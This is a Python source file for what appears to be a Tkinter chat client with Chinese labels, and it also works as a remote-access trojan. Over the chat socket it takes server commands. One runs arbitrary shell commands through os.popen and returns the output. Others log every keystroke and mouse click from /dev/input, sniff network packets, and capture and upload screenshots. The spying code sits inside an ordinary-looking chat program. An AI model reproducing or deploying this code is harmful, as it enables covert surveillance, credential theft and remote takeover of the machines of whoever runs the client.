from socket import *
import threading
from tkinter import *
import os
from pyscreenshot import *
from PIL import Image
import matplotlib.pyplot as plt
from evdev import InputDevice
from select import select
import time
from scapy.all import sniff,IP,wrpcap,Ether,IP,DNS,DNSQR,ARP,TCP,UDP
import os,json,struct

address = ''
port = ''
## 登录窗口
root1 = Tk()
root1.title('登录')
root1['height'] = 70
root1['width'] = 270
root1.resizable(0, 0)  # 限制窗口大小

IP1 = StringVar()
IP1.set('192.168.43.219:10005')  # 默认显示的ip和端口

# 服务器标签
labelIP = Label(root1, text='服务器地址')
labelIP.place(x=30, y=10, width=80, height=20)

entryIP = Entry(root1, width=80, textvariable=IP1)
entryIP.place(x=120, y=10, width=130, height=20)

# 登录按钮
def login(*args):
    global address, port
    address, port = entryIP.get().split(':')  # 获取IP和端口号
    port = int(port)
    root1.destroy()  # 关闭窗口
root1.bind('<Return>', login)  # 回车绑定登录功能

but = Button(root1, text='登录', command=login)
but.place(x=100, y=40, width=70, height=30)

root1.mainloop()

buffsize=1024
s=socket(AF_INET, SOCK_STREAM)
s.connect((address,port))

t_flag = 0  # it is used to set the state of threads, when it is 1, threads will always sleep


def detectInputKey_board():
    global t_flag
    print('Now start hook keyboard')
    dev = InputDevice('/dev/input/event1')
    keylist = {1:'ESC', 2: '1', 3: '2', 4: '3', 5: '4', 6: '5', 7: '6', 8: '7',9: '8',10: '9', 11: '0', 14: 'backspace', 15: 'tab', 16: 'q', 17: 'w', 18: 'e',19: 'r', 20: 't', 21: 'y', 22: 'u', 23: 'i', 24: 'o', 25: 'p', 26: '[',27: ']', 28: 'enter', 29: 'ctrl', 30: 'a', 31: 's', 32: 'd', 33: 'f', 34: 'g',35: 'h', 36: 'j', 37: 'k', 38: 'l', 39: ';', 40: "'", 41: '`', 42: 'shift',43: '\\', 44: 'z', 45: 'x', 46: 'c', 47: 'v', 48: 'b', 49: 'n', 50: 'm',51: ',',52: '.', 53: '/', 54: 'shift', 56: 'alt', 57: 'space', 58: 'capslock', 59: 'F1',60: 'F2', 61: 'F3',62: 'F4',63: 'F5',64: 'F6',65: 'F7',66: 'F8',67: 'F9',68: 'F10',69: 'numlock',70: 'scrollock',87: 'F11',88: 'F12',97: 'ctrl',99: 'sys_Rq',100: 'alt',102: 'home',104: 'PageUp',105: 'Left',106: 'Right',107: 'End',108: 'Down',109: 'PageDown',111: 'del',125: 'Win',126:'Win',127: 'compose'}
    while True:
        while t_flag == 1:
            t_flag=t_flag  # lock
        select([dev],[],[])
        for event in dev.read():
            #print (event.code)
            #s.send(event.encode())
            if(event.value == 1) and event.code != 0 :
                massage = 'keyboard press: ' + keylist[event.code] + '  User IP: '
                s.send(massage.encode())


def detectInputKey_mouse():
    global t_flag
    mouse_list = {272:'left_mouse',273:'right_mouse',274:'miidle_mouse'}
    event_list = {0:'release',1:'press'}
    print('Now start hook mouse')
    dev = InputDevice('/dev/input/event2')
    while True:
        while t_flag == 1:
            t_flag=t_flag  #lock
        select([dev], [], [])
        for event in dev.read():
            if (event.value == 1 or event.value == 0) and event.code != 0:
                if(event.code != 1):
                    massage1 = 'key: ' + mouse_list[event.code] + '    '
                    s.send(massage1.encode())
                    #print(event.value)
                    massage2 = 'event: ' + event_list[event.value]
                    s.send(massage2.encode())
                    #print "Key: %s Status: %s" % (event.code, "pressed" if event.value else "release")

def get_package():
    dpkt = sniff(iface='ens33',count = 10)
    wrpcap('log.pcap',dpkt)
    tip = "Now shows 10 latest destination"
    for i in range(0,10):
        info = ''
        if(dpkt[i][Ether].type==0x800):
            info += dpkt[i][IP].src
            info += ' -----> '
            info += dpkt[i][IP].dst
            if(dpkt[i][IP].proto==17):
                info += '   proto:UDP  '
                info += str(dpkt[i][UDP].sport)
                info += ' -----> '
                info += str(dpkt[i][UDP].dport)
                print (dpkt[i][IP].dport)
                if(dpkt[i][IP].dport==53):
                    info += "   "
                    info += str(dpkt[i][DNS][DNSQR].qname)
                if(dpkt[i][IP].dport==67):
                    info += "   "
                    info += "DHCP"
            elif(dpkt[i][IP].proto==6):
                info += '   proto:TCP  '
                info += str(dpkt[i][TCP].sport)
                info += ' -----> '
                info += str(dpkt[i][TCP].dport)
            else:
                info += '   Unknown IP protocol'
        elif(dpkt[i][Ether].type==0x806):
            info += "ARP: "
            info += str(dpkt[i][ARP].op)
            info += " -----> hwsrc:"
            info += dpkt[i][ARP].hwsrc
            info += " -----> hwdst:"
            info += dpkt[i][ARP].hwdst
        elif(dpkt[i][Ether].type==0x888e):
            info += "Shakehand: "
            info += dpkt[i][Ether].src
            info += ' -----> '
            info += dpkt[i][Ether].dst
        else:
            info += "Other packets"
        print (dpkt[i].display())
        info += '\n'
        s.send(info.encode())

def detect():
    time_start = time.time()
    times = 100
    time_end = time.time()
    while True:
        times-=1
        tmp = sniff(iface='ens33',count=10)
        time_end = time.time()
        if(time_end-time_start>10):
            tip = "No Attack Found"
            s.send(tip.encode())
            return
        if(times<=0):
            break
    if(time_end-time_start<5):
        tip = "Flood Warning!"
        s.send(tip.encode())
        return
    tip = "No Attack Found"
    s.send(tip.encode())


def do_sniff():
    global t_flag
    print (t_flag)
    while True:
        while t_flag == 1:  
            t_flag=t_flag  #lock
        get_package()
        time.sleep(3)


def screen_shot():
    tip = 'screen shot now'
    time.sleep(1)
    filemode = 'file'
    s.send(tip.encode())
    time.sleep(1)
    s.send(filemode.encode())
    try:
        grab_to_file('log.jpg')
    except:
        tip2 = 'grab error'
        s.send(tip2.encode())
    #img = Image.open('log.jpg')
    #plt.figure('screen')
    #plt.imshow(img)
    #plt.show()
    filename = 'log.jpg'
    f = open(filename,'rb')
    while True:
        data = f.read(1024)
        print(data)
        if not data:
            time.sleep(1)
            tip3 = "get over"
            s.send(tip3.encode())
            f.close()
            break
        s.send(data)


def recv():
    global t_flag
    while True:
        recvdata = s.recv(buffsize).decode('utf-8')
        if(recvdata=='command'):
            print ('You are now controlled')
            while True:
                recvdata = s.recv(buffsize).decode('utf-8')
                if(recvdata == 'exit'):
                    print ('You are now free')
                    exit_tip = 'command over '
                    s.send(exit_tip.encode())
                    break
                process = os.popen(recvdata)
                output = process.read()
                s.send(output.encode())
        if(recvdata=='hook'):
            t_flag = 0  # open thread
            t_hook = threading.Thread(target = detectInputKey_board,args=(),name='detectInputKey_board')
            t_hook.start()
            t_hook2 = threading.Thread(target = detectInputKey_mouse,args=(),name='detectInputKey_board')
            t_hook2.start()
            while True:
                recvdata = s.recv(buffsize).decode('utf-8')
                if(recvdata == 'exit'):
                    print('hook over')
                    exit_tip = 'hook over '
                    s.send(exit_tip.encode())
                    t_flag = 1  # close thread
                    break
    
        if(recvdata=='sniff'):
            t_flag = 0  # open thread
            t_sniff = threading.Thread(target = do_sniff,args=(),name="do_sniff")
            t_sniff.start()
            while True:
                recvdata = s.recv(buffsize).decode('utf-8')
                if(recvdata == 'exit'):
                    print('sniff over')
                    exit_tip = 'sniff over '
                    s.send(exit_tip.encode())
                    t_flag = 1  # close thread
                    break

        if(recvdata=='screen'):
            tip = 'shot_screen'
            s.send(tip.encode())
            screen_shot()
            
        if(recvdata=='detect'):
            detect()

        if recvdata[0] == "'":
            gui.listBox.insert(END,recvdata)
        else:
            gui.listBox.insert(END,'服务端：'+recvdata)
        print('\n' + recvdata)

class GUI:
    def __init__(self, root):
        self.root = root
        
        self.label1 = Label(self.root,text='聊天信息')
        self.label1.pack()
        self.listBox = Listbox(self.root, width=40, height=15)
        self.listBox.pack()
        self.label1 = Label(self.root,text='文本输入')
        self.label1.pack()
        self.entry = Entry(self.root,width=40,highlightcolor='red', highlightthickness=1)
        self.entry.pack()

        self.scroll = Scrollbar(self.listBox)
        self.scroll.place(x = 260,y = 0,width=20, height=270)
        #linux 系统中x=300，height = 330

        self.sendBtn = Button(self.root, text='单发', command=self.send,width=8,bg = 'dodgerblue')
        self.sendBtn.pack(side='left')

        self.sendallBtn = Button(self.root, text='群发', command=self.sendall,width=8,bg = 'springgreen')
        self.sendallBtn.pack(side='left')
        
        self.closeBtn = Button(self.root, text='关闭', command=self.close,width=16,bg = 'plum')
        self.closeBtn.pack(side='right')

        self.listBox.config(yscrollcommand = self.scroll.set)
        self.scroll.config(command = self.listBox.yview)

        self.root.bind('<KeyPress-Up>',self.Send)
        self.root.bind('<KeyPress-Down>',self.Sendall)

    def send(self):
        senddata = self.entry.get()
        gui.listBox.insert(END, '客户端：'+senddata)
        s.send(senddata.encode())
        self.entry.delete(0,END)

    def sendall(self):
        senddata = self.entry.get()
        data = '&'+str(senddata)
        gui.listBox.insert(END, '客户端：'+senddata)
        s.send(data.encode())
        self.entry.delete(0,END)

    def Send(self,root):
        senddata = self.entry.get()
        gui.listBox.insert(END, '客户端：'+senddata)
        s.send(senddata.encode())
        self.entry.delete(0,END)

    def Sendall(self,root):
        senddata = self.entry.get()
        data = '&'+str(senddata)
        gui.listBox.insert(END, '客户端：'+senddata)
        s.send(data.encode())
        self.entry.delete(0,END)
        
    def close(self):  
        sys.exit()

def createGUI():
    global gui
    root = Tk()
    root.resizable(0, 0)
    gui = GUI(root)
    root.title('客户端 IP:'+address)
    root.mainloop()
    
if __name__ == '__main__':
    t1 = threading.Thread(target=recv, args=(), name='recv')
    t2 = threading.Thread(target=createGUI, args=(), name='gui')

    t1.start()
    t2.start()
